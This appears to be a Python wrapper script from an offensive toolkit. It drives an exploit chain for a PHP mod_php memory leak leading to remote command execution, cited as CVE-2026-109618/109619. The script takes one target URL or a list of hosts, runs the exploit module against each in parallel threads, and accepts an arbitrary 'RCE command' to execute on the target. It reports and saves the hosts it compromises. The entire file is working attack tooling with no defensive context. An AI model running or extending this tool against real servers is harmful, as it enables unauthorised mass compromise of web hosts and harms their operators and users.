#!/usr/bin/env python3
"""PHP2Shell mod_php Leak Chain — CVE-2026-109618/109619 (Murrez).

Wraps xplotas/php2shell/xplota_7/modphp_leak_chain.py for the Xplota UI.
Adapter for mod_php/cli-server leak → zif_system chain. Uses requests library
(HTTPS supported). Targets PHP 8.4.x mod_php. Auto-detects PHP version via
X-Powered-By header.

Usage:
    python3 scanner.py -u https://target.com -o results.json
    python3 scanner.py -l hosts.txt -o results.json
"""
from __future__ import annotations

import argparse, json, os, subprocess, sys, threading, time
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

CVES = "CVE-2026-109618 / CVE-2026-109619"
_HERE = Path(__file__).resolve().parent
_EXPLOIT = _HERE.parents[2] / "xplotas" / "php2shell" / "xplota_7" / "modphp_leak_chain.py"

_CRASH_MARKERS = ("Traceback", "RuntimeError:", "ConnectionRefusedError:", "TimeoutError:",
                  "ModuleNotFoundError", "ImportError")


def _parse_url(raw: str) -> str:
    raw = raw.strip()
    if "://" not in raw:
        raw = "http://" + raw
    return raw


def _run(target: str, cmd: str, timeout: int, insecure: bool) -> dict[str, Any]:
    url = _parse_url(target)
    args = [sys.executable, "-u", str(_EXPLOIT), "--url", url,
            "--timeout", str(timeout)]
    if cmd:
        args += ["--cmd", cmd]
    if insecure:
        args += ["--no-verify"]

    t0 = time.monotonic()
    lines: list[str] = []
    error: str | None = None
    exit_code: int | None = None

    try:
        proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            cwd=str(_EXPLOIT.parent), env={**os.environ, "PYTHONUNBUFFERED": "1"},
            text=True, encoding="utf-8", errors="replace")
        assert proc.stdout
        for line in proc.stdout:
            line = line.rstrip("\r\n")
            if line:
                print(f"[LOG] {line}", flush=True)
                lines.append(line)
        proc.wait(timeout=5)
        exit_code = proc.returncode
    except FileNotFoundError:
        error = f"exploit not found: {_EXPLOIT}"; exit_code = -2
    except Exception as exc:
        error = str(exc); exit_code = -3

    stdout = "\n".join(lines)
    is_crash = exit_code == 1 and any(m in stdout for m in _CRASH_MARKERS)

    if error and exit_code not in (0, 1):
        vuln, verdict, reason = None, "ERROR", error
    elif is_crash:
        vuln, verdict = None, "INCONCLUSIVE"
        reason = next((l.strip() for l in lines if any(m in l for m in _CRASH_MARKERS)), "Exploit crashed")
    elif exit_code == 0:
        vuln, verdict = True, "VULNERABLE"
        reason = next((l.split("]", 1)[-1].strip() for l in reversed(lines) if "[+]" in l),
                      "mod_php leak → zif_system chain succeeded")
    else:
        vuln, verdict, reason = False, "NOT VULNERABLE", "Leak chain did not complete — target appears patched"

    bracket = "VULNERABLE" if vuln is True else ("NOT VULNERABLE" if vuln is False else "INCONCLUSIVE")
    print(f"[{bracket}] {target} - {reason}", flush=True)
    return {"target": target, "url": target, "tested_url": url,
            "vulnerable": vuln, "verdict": verdict, "reason": reason,
            "error": error, "elapsed": round(time.monotonic() - t0, 2),
            "exit_code": exit_code, "log": stdout[-4096:]}


def main() -> None:
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--url"); g.add_argument("-l", "--list")
    ap.add_argument("-o", "--output", required=True)
    ap.add_argument("-t", "--threads", type=int, default=3)
    ap.add_argument("--timeout", type=int, default=120)
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--verbose", "-v", action="store_true")
    ap.add_argument("--all-results", action="store_true")
    ap.add_argument("-k", "--insecure", action="store_true")
    ap.add_argument("--cmd", default="", help="RCE command")
    args = ap.parse_args()

    targets = ([args.url.strip()] if args.url else
               [l.strip() for l in Path(args.list).read_text().splitlines()
                if l.strip() and not l.startswith("#")])
    if not targets: raise SystemExit("No targets")

    results: list[dict] = []
    lock = threading.Lock()

    def process(t: str) -> None:
        r = _run(t, args.cmd, args.timeout, args.insecure)
        with lock:
            if args.all_results or r["vulnerable"] is not False:
                results.append(r)

    threads = min(args.threads, 5)
    if threads <= 1 or len(targets) == 1:
        for t in targets: process(t)
    else:
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=threads) as pool:
            for f in as_completed({pool.submit(process, t): t for t in targets}):
                try: f.result()
                except Exception as e: print(f"[ERROR] {e}", flush=True)

    Path(args.output).write_text(json.dumps(results, indent=2), encoding="utf-8")
    raise SystemExit(1 if any(r["vulnerable"] for r in results) else 0)


if __name__ == "__main__":
    main()
